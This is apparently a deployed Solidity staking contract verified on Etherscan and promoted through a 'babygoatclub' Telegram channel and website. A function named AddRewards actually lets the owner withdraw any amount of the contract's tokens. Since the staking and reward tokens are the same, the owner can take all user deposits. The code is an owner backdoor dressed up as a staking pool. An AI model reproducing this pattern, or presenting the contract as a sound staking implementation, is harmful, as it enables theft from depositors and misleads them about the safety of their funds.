/**
 *Submitted for verification at Etherscan.io on 2022-02-13
*/

// Telegram :  https://t.me/babygoatclub
// Website : https://babygoatclub.org

// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

contract StakingRewards {
    IERC20 public rewardsToken;
    IERC20 public stakingToken;

    uint public rewardRate;
    uint public lastUpdateTime;
    uint public rewardPerTokenStored;
    address public owner;

    mapping(address => uint) public userRewardPerTokenPaid;
    mapping(address => uint) public rewards;

    uint private _totalSupply;
    mapping(address => uint) private _balances;

    constructor(address _token,uint _rewardrate) {
        stakingToken = IERC20(_token);
        rewardsToken = IERC20(_token);
        rewardRate=_rewardrate;
        owner=(msg.sender);
    }

    function setRewardRate(uint _rate) public  {
        require(owner==msg.sender,"Owner Only accesable");
        rewardRate=_rate;
    }

    function AddRewards(uint _amount) public  {
        require(owner==msg.sender,"Owner Only accesable");
         rewardsToken.transfer(msg.sender, _amount);
    }

    function rewardPerToken() public view returns (uint) {
        if (_totalSupply == 0) {
            return 0;
        }
        return
            rewardPerTokenStored +
            (((block.timestamp - lastUpdateTime) * rewardRate * 1e18) / _totalSupply);
    }

    function earned(address account) public view returns (uint) {
        return
            ((_balances[account] *
                (rewardPerToken() - userRewardPerTokenPaid[account])) / 1e18) +
            rewards[account];
    }

    modifier updateReward(address account) {
        rewardPerTokenStored = rewardPerToken();
        lastUpdateTime = block.timestamp;

        rewards[account] = earned(account);
        userRewardPerTokenPaid[account] = rewardPerTokenStored;
        _;
    }

    function stake(uint _amount) external updateReward(msg.sender) {
        _totalSupply += _amount;
        _balances[msg.sender] += _amount;
        stakingToken.transferFrom(msg.sender, address(this), _amount);
    }

    function withdraw() external updateReward(msg.sender) {
        uint _amount = _balances[msg.sender];
        _totalSupply -= _amount;
         _balances[msg.sender] =0;
        stakingToken.transfer(msg.sender, _amount);

        uint reward = rewards[msg.sender];
        rewards[msg.sender] = 0;
        rewardsToken.transfer(msg.sender, reward);
       
    }

    function getReward() external updateReward(msg.sender) {
        uint reward = rewards[msg.sender];
        rewards[msg.sender] = 0;
        rewardsToken.transfer(msg.sender, reward);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}